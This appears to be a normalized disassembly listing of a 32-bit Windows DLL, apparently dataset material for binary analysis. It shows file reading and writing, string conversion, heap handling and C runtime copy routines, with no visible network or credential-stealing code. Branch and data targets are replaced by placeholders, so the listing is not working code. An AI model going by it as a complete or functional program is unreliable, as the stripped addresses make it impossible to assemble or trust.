push 0x104
push edi
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax esi
lea ecx [ eax + 0x1 ]
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push 0x0
mov edi eax
mov eax [ ebp - 0x210 ]
lea ecx [ ebp - 0x218 ]
push ecx
push ebx
lea edx [ edi + esi + 0x1 ]
push edx
push eax
mov [ edi + esi ] 0x5c
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x214 ]
push esi
lea ebx [ edi + ebx + 0x1 ]
push ecx
call sub_10008a20
mov edx [ ebp - 0x210 ]
push edx
call [ CloseHandle@IAT ]
push esi
call sub_10009181
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
sub_10008850
push ebp
mov ebp esp
push ecx
push esi
push 0x0
push 0x2
push 0x4
push 0x0
push 0x2
push 0x23
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push eax
push ecx
push esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
push 0x8
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
push esi
call [ CloseHandle@IAT ]
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
xor esi esi
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov esi eax
jmp r-xdata
push 0x1
push 0x66
mov [ ebp + 0xc ] esi
call sub_100091bb
push 0x66
push r--data
push eax
mov [ esi ] eax
call sub_1000a7c0
add esp 0x14
lea ecx [ ebp + 0xc ]
push ecx
lea eax [ edi + 0xc ]
mov [ esi + 0x4 ] 0x66
call sub_10005630
add [ edi + 0x4 ] 0x66
sub_10008900
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
mov [ ecx ] 0x1
test esi esi
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
cmp [ eax + edx ] 0x26
jne r-xdata
inc eax
cmp eax esi
jb r-xdata
inc [ ecx ]
mov eax [ ecx ]
cmp eax 0x1
jne r-xdata
push edi
push 0x4
push eax
call sub_100091bb
mov edi eax
push 0x1
push esi
mov [ ebp - 0x4 ] edi
call sub_100091bb
add esp 0x10
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
test eax eax
je r-xdata
push ebx
xor edi edi
xor esi esi
xor ebx ebx
lea esp [ esp ]
inc edi
inc esi
cmp edi [ ebp + 0xc ]
jb r-xdata
lea ecx [ esi + 0x2 ]
push 0x1
push ecx
call sub_100091bb
mov edx [ ebp - 0x4 ]
mov ecx edi
sub ecx esi
add ecx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edx + ebx * 4 ] eax
call sub_1000a7c0
add esp 0x14
xor esi esi
inc ebx
inc edi
mov eax [ ebp + 0x8 ]
cmp [ edi + eax ] 0x26
jne r-xdata
lea edx [ esi + 0x2 ]
push 0x1
push edx
call sub_100091bb
mov ecx [ ebp - 0x4 ]
sub edi esi
add edi [ ebp + 0x8 ]
push esi
push edi
push eax
mov [ ecx + ebx * 4 ] eax
call sub_1000a7c0
mov eax [ ebp - 0x4 ]
add esp 0x14
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_100089d0
push ebp
mov ebp esp
push ecx
push esi
push 0x8
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
push 0x1
push edi
mov [ ebp - 0x4 ] esi
call sub_100091bb
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi ] eax
call sub_1000a7c0
add esp 0x14
lea edx [ ebp - 0x4 ]
push edx
lea eax [ ebx + 0xc ]
mov [ esi + 0x4 ] edi
call sub_10005630
add [ ebx + 0x4 ] edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov esi eax
sub_10008a20
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x10
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
push 0x1
push ebx
mov [ ebp - 0x4 ] esi
call sub_100091bb
mov edx [ ebp + 0xc ]
push ebx
mov edi eax
push edx
push edi
call sub_1000a7c0
add esp 0x14
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx 0xffff
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x24
call sub_10005630
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
sub_10008aad
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10008c8d
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10009ef4
int3
sub_10008afa
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10008c8d
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10009ef4
int3
sub_10008b47
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10008ce9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10008d40
pop ecx
sub_10008b73
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_10008d9c
push eax
mov [ esi ] eax
call sub_10008bb6
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10008c2f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_1000a0b0
lea esi [ eax + 0x1 ]
push esi
call sub_10009388
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1000a049
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10008c8d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_10008c2f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008cb4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_10008c6f
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_10008c2f
jmp r-xdata
sub_10008cf4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008c6f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10008d40
pop ecx
sub_10008d1b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_10008cb4
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008d5b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10008d4b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10008d40
pop ecx
sub_10008d7c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1000a1b0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10008d9c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10009388
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1000a247
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10008d1b
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10009ef4
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_10008c05
push sub_10011f21
mov [ rw-data ] esi
call sub_10009a0e
pop ecx
sub_10008e20
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10008ea4 ]
jmp [ ecx * 4 + jump_table_10008f24 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10008f90 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1000912c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10009030 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000912c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10008f90 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000912c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10008f90 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10008f90 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10008f90 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000912c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000912c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000912c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10009181
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1000a3c4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000a382
pop ecx
mov [ esi ] eax
pop esi
sub_100091bb
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a43f
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_1000a3c4
test eax eax
je r-xdata
call sub_1000a3c4
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_10009225
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1000a740
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000a7c0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1000a3c4
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1000acab
mov eax esi
jmp r-xdata
sub_1000929a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1000aec7
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000acbb
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000acbb
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_10009388
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1000a247
pop ecx
call sub_1000a3c4
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1000a6ea
push 0x1e
call sub_1000a53b
push 0xff
call sub_1000bfad
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1000a3c4
mov [ eax ] esi
push ebx
call sub_1000a247
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1000a3c4
mov [ eax ] esi
sub_1000941c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1000ca19
pop ecx
push eax
call sub_1000c945
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10009484
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1000941c
pop ecx
test eax eax
je r-xdata
push esi
call sub_100094cc
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1000ca19
push eax
call sub_1000ca3f
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_100094cc
push 0x14
push r--data
call sub_1000bc40
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000959d
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1000bc85
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1000bba3
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1000956e
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10009484
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10009484
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_100095af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000d892
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000d669
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000cee8
mov [ esi + 0x4 ] eax
sub_10009636
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10009181
pop ecx
sub_10009656
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_1000941c
push esi
mov edi eax
call sub_1000dfe2
push esi
call sub_1000ca19
push eax
call sub_1000df1e
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10009181
and [ esi + 0x1c ] 0x0
pop ecx
sub_100096c3
push 0xc
push r--data
call sub_1000bc40
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1000bb62
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10009656
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000972f
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_1000bc85
retn
mov eax [ ebp - 0x1c ]
sub_10009737
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_1000e020
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_10009788
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1000a3c4
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1000acab
mov eax esi
jmp r-xdata
sub_10009888
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
